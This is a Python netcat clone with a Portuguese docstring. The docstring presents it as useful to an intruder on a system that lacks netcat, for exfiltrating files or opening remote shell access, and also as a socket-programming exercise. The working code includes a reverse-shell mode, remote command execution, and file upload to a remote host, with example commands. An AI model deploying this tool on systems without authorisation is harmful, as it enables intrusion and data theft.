#!/usr/bin/env python3
"""
O netcat é um autêntico canivete suiço para redes. Permite ligar
processos remotamente, implementar proxies de rede, "port "scanners",
executar processos remotamente, transferir ficheiros e abrir linhas
de comando remotas. É uma das primeiras ferramentas que um hacker tenta
utilizar assim que consegue penetrar num sistema, e, por isso, é também
a primeira a ser removida por administradores de sistemas experientes.
Muitos sistemas não têm o netcat instalado, mas, em compensação
têm um interpretador de Python pronto a ser explorado. Nestes casos,
pode ser útil implementar um clone do netcat para podermos transferir
ficheiros para fora do sistema, ou simplesmente como forma de dar
acesso remoto à shell do sistema. Implementar um clone do netcat é
também um excelente exercício de programação em Python com sockets.
"""

import re
import sys
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
import argparse
import shlex
import subprocess
import ipaddress
import textwrap

def main():
    cmd_desc = "Netcat clone implemented in Python"
    usage_examples = textwrap.dedent("""
    Examples:
        # Execute a command and redirect output to 192.168.64.6:5001 
        netcat -p 5001 connect -a 192.168.64.6 -e 'ls -l'

        # Execute a command locally and redirect output to 
        # 192.168.64.6:5555. 5555 is the default port 
        netcat connect -a 192.168.64.6 -e 'ls -l'

        # Execute a shell locally, accepting command coming from 
        # host 192.168.64.6:5555. Output is also redirected to that host
        netcat connect -a 192.168.64.6 -s

        # Upload a local file to host 192.168.64.6:5555 
        netcat connect -a 192.168.64.6 -u 'dados.bin'

        # Launch in server mode, wait/listening for incoming 
        # connections. Listen on interface 192.168.64.1, port 5001
        netcat -p 5001 listen -a 192.168.64.1 

        # Launch in server mode, wait/listening for incoming connections
        # on all interfaces, using the default port
        netcat listen

        # The same as above
        netcat listen -a 0.0.0.0

        # Listen on localhost, port 8080, with auto-replies
        netcat -p 8080 listen -a 127.0.0.1 -A
    """)
    parser = argparse.ArgumentParser(
        formatter_class = argparse.RawDescriptionHelpFormatter,
        description = cmd_desc,
        epilog = usage_examples,
    )
    parser.add_argument(
        '-p', '--port',
        type = positive_int,
        default = 5555,
        help = 'network port to use'
    )
    commands = parser.add_subparsers(title='Commands', dest='command', required=True)

    connect_parser = commands.add_parser('connect')
    connect_parser.add_argument(
        '-a', '--address',
        type = ensure_valid_host_or_ip,
        default = '127.0.0.1',
        help = 'server/listener host IP',
    )
    group = connect_parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '-s', '--shell',
        action = 'store_true',
        help = 'launch a command shell locally',
    )
    group.add_argument(
        '-e', '--execute',
        help = 'execute a shell command locally',
    )
    group.add_argument(
        '-u', '--upload',
        help = 'upload local file to target',
    )

    listen_parser = commands.add_parser('listen')
    listen_parser.add_argument(
        '-a', '--address',
        type = ensure_valid_host_or_ip,
        default = '0.0.0.0',
        help = 'local IP address to listen on',
    )
    listen_parser.add_argument(
        '-A', '--auto-reply',
        action = 'store_true',
        default = False,
        help = "automatically reply to clients, sending a new line for each block received",
    )

    args = parser.parse_args()
    nc = Netcat(args)
    nc.start()
#:

class Netcat:
    LISTEN_CONNECTIONS = 5
    CMD_LINE_BUFFER_DIM = 512
    FILE_BUFFER_DIM = 4096
    LISTEN_BUFFER_DIM = 4096

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.nc_socket = socket(AF_INET, SOCK_STREAM)
        self.nc_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    #:

    def start(self):
        match self.args.command:
            case 'connect':
                self.connect()
            case 'listen':
                self.listen()
            case _:
                raise NetcatError(f"Invalid command for '{self.__class__.__name__}'")
    #:

    def connect(self):
        exit_code = 0
        try:
            with self.nc_socket as client_socket:
                server_addr = (str(self.args.address), self.args.port) 
                client_socket.connect(server_addr)

                handler = (
                    self.exec_shell     if self.args.shell else
                    self.exec_cmd       if self.args.execute else
                    self.exec_upload    if self.args.upload else
                    None
                )
                if handler is None:
                    raise NetcatError(f"No sub-command defined for command 'connect'")

                handler(client_socket)

        except KeyboardInterrupt:
            print_status("CTRL+C pressed...")
        except ConnectionRefusedError as ex:
            print_status(f"Connection error: {ex}")
            exit_code = 3
        except Exception as ex:
            print_status(f"Error: {ex}")
            exit_code = 10
        finally:
            print_status("Exiting...")
            sys.exit(exit_code)
    #:

    def exec_shell(self, client_socket: socket):
        cmd_output = b''
        prompt = b'CMD:> '
        while True:
            shell_output = cmd_output + prompt
            client_socket.send(shell_output)

            cmd_line = client_socket.recv(self.CMD_LINE_BUFFER_DIM)
            cmd = cmd_line.decode().strip()

            if cmd.lower() in ('exit', 'quit'):
                return

            if len(cmd) > 0:
                cmd_output = exec_cmd(cmd).encode()
                if len(cmd_output) > 0:
                    cmd_output += b'\n'
    #:

    def exec_cmd(self, client_socket: socket):
        output = exec_cmd(self.args.execute)
        client_socket.send(output.encode())
    #:

    def exec_upload(self, client_socket: socket):
        with open(self.args.upload, 'rb') as file:
            while buffer := file.read(self.FILE_BUFFER_DIM):
                client_socket.send(buffer)
    #:

    def listen(self):
        exit_code = 0
        try:
            bind_addr = (str(self.args.address), self.args.port)
            self.nc_socket.bind(bind_addr)
            self.nc_socket.listen(self.LISTEN_CONNECTIONS)

            while True:
                print_status(f"Waiting for connections on {bind_addr[0]}:{bind_addr[1]}")
                client_socket, connect_addr = self.nc_socket.accept()
                print_status(f"Connection from {connect_addr[0]}:{connect_addr[1]}")
                self.handle_client(client_socket)

        except KeyboardInterrupt:
            print_status("User terminated with CTRL+C...")
        except ConnectionResetError:
            print_status("Connection closed by peer...")
        except EOFError:
            print_status("Reached EOF during input")
        except Exception as ex:
            print_status(f"Error: {ex}")
            exit_code = 10
        finally:
            print_status("Exiting...")
            sys.exit(exit_code)
    #:

    def handle_client(self, client_socket: socket):
        with client_socket:
            while True:
                data = False
                while block := client_socket.recv(self.LISTEN_BUFFER_DIM):
                    data = True
                    sys.stdout.buffer.write(block)
                    sys.stdout.flush()
                    if len(block) < self.LISTEN_BUFFER_DIM:
                        break
                if data:
                    line = '' if self.args.auto_reply else input()
                    line += '\n'
                    client_socket.send(line.encode())
#:

class NetcatError(Exception):
    """
    Base exception for all Netcat errors.
    """
#:

def exec_cmd(cmd: str) -> str:
    if len(cmd.strip()) == 0:
        raise NetcatError("Can't execute an empty command")
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()
#:

def ensure_valid_host_or_ip(host_or_ip: str) -> str:
    try: 
        ipaddress.ip_address(host_or_ip)
    except ValueError:
        if not is_valid_hostname(host_or_ip):
            raise ValueError(f'Not a valid hostname nor IPv4 address "{host_or_ip}"')
    return host_or_ip
#:

def _make_is_valid_hostname():
    allowed = re.compile(r"(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    def _is_valid_hostname(hostname):
        """
        From: http://stackoverflow.com/questions/2532053/validate-a-hostname-string
        See also: https://en.wikipedia.org/wiki/Hostname (and the RFC 
        referenced there)
        """
        if not 0 < len(hostname) <= 255:
            return False
        if hostname[-1] == ".":
            # strip exactly one dot from the right, if present
            hostname = hostname[:-1]
        return all(allowed.match(x) for x in hostname.split("."))
    return _is_valid_hostname
#:
is_valid_hostname = _make_is_valid_hostname()


def positive_int(val) -> int:
    val = int(val)
    if val < 0:
        raise argparse.ArgumentTypeError('Not a positive int')
    return val
#:

def print_status(*args, **kargs):
    print(*args, **kargs, file=sys.stderr)
#:

if __name__ == '__main__':
    main()
